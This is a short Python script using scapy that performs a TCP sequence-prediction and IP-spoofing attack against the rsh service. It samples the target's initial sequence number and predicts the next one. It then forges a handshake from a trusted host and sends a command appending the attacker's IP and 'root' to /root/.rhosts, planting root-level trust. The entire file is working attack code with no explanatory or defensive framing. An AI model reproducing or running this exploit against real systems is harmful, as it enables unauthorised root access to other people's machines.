from scapy.all import *

import sys
import time
import random

if __name__ == "__main__":
    conf.verb = 0
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]

    my_ip = get_if_addr(sys.argv[1])

    rsh_port = 514

    spoof_sport = random.randint(512, 1023)

    probe_sport = random.randint(10000, 60000)

    probe_syn = IP(dst=target_ip)/TCP(sport=probe_sport, dport=rsh_port, flags="S")

    probe_resp = sr1(probe_syn, timeout=2, iface=conf.iface)

    isn_sample = probe_resp[TCP].seq

    rst_pkt = IP(dst=target_ip)/TCP(sport=probe_sport, dport=rsh_port, flags="R", seq=probe_resp.ack)

    send(rst_pkt, iface=conf.iface)

    increment = 128000

    predicted_isn = (isn_sample + increment) % 4294967296

    my_seq = 1001 

    syn_pkt = IP(src=trusted_host_ip, dst=target_ip)/TCP(sport=spoof_sport, dport=rsh_port, flags="S", seq=my_seq)

    send(syn_pkt, iface=conf.iface)

    time.sleep(1.5) 

    ack_pkt = IP(src=trusted_host_ip, dst=target_ip)/TCP(sport=spoof_sport, dport=rsh_port, flags="A", seq=my_seq+1, ack=predicted_isn+1)

    send(ack_pkt, iface=conf.iface)

    time.sleep(0.5)

    cmd = f"echo '{my_ip} root' >> /root/.rhosts"

    payload = b"0\x00root\x00root\x00" + cmd.encode() + b"\x00"

    psh_pkt = IP(src=trusted_host_ip, dst=target_ip)/TCP(sport=spoof_sport, dport=rsh_port, flags="PA", seq=my_seq+1, ack=predicted_isn+1)/Raw(load=payload)

    send(psh_pkt, iface=conf.iface)